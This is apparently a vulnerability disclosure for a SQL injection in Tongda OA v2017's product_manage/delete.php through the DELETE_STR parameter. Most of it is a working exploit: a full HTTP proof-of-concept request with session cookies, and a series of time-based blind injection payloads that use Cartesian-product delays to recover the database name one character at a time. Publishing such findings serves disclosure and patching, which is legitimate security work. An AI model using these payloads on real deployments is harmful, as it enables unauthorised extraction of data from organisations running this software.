SQL injection vulnerability exists in Tongda OA

version:Tongda v2017 version

1.
Route: /general/office_product/product_manage/delete.php
There is an injected parameter: $DELETE_STR
The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/18333199082/cve/assets/66902364/383d24ae-4102-4f26-b6f2-9ae3327ac186)

POC

```
GET /general/office_product/product_manage/delete.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: USER_NAME_COOKIE=admin; SID_1=305dc588; PHPSESSID=gbht77r028h3fv1j9skn5oppr1; OA_USER_ID=admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```
2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1

![image](https://github.com/18333199082/cve/assets/66902364/73b0f9fb-ebe6-4f55-8706-a8ddb1227e8c)
Intercept the second digit of the database through blind injection, and determine the second digit as the letter d through the delay time
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1

![image](https://github.com/18333199082/cve/assets/66902364/322bc102-fc17-4e5c-a1f1-6438408977aa)

The third digit is the character _
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1

![image](https://github.com/18333199082/cve/assets/66902364/06d67484-daf7-407b-a2a2-d13489da9699)

The fourth digit is the character o
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1

![image](https://github.com/18333199082/cve/assets/66902364/3c8ec1d7-583b-4b2c-8fce-635f8242bc0c)

The fifth digit is the character a
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B) and (1)=(1

![image](https://github.com/18333199082/cve/assets/66902364/a24ca818-ea42-47f2-bcde-2fa323fdc4c7)

Then through blind injection, you can determine that the database name is: td_oa

